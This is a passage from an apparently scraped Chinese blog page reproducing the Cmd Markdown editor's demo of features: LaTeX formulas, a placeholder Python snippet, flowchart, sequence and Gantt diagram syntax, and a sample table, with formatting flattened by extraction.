Cmd 渲染算法，使用局部渲染技术提高渲染效率 新增 Todo 列表功能 修复 LaTex 公式渲染问题 新增 LaTex 公式编号功能 2. 书写一个质能守恒公式[^LaTeX]E=mc2E=mc2 3. 高亮一段代码[^code]1234567@requires_authorizationclass SomeClass: passif __name__ == &apos;__main__&apos;: # A comment print &apos;hello world&apos; 4. 高效绘制 流程图123456789flowst=&gt;start: Startop=&gt;operation: Your Operationcond=&gt;condition: Yes or No?e=&gt;endst-&gt;op-&gt;condcond(yes)-&gt;econd(no)-&gt;op 5. 高效绘制 序列图123Alice-&gt;Bob: Hello Bob, how are you?Note right of Bob: Bob thinksBob--&gt;Alice: I am good thanks! 6. 高效绘制 甘特图12345678910111213title 项目开发流程section 项目确定 需求分析 :a1, 2016-06-22, 3d 可行性报告 :after a1, 5d 概念验证 : 5dsection 项目实施 概要设计 :2016-07-05 , 5d 详细设计 :2016-07-08, 10d 编码 :2016-07-15, 10d 测试 :2016-07-22, 5dsection 发布验收 发布: 2d 验收: 3d 7. 绘制表格 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234","categories":[],"tags":[{"name":"other","slug":"other","permalink":"https://shackles.top/tags/other/"}]}]}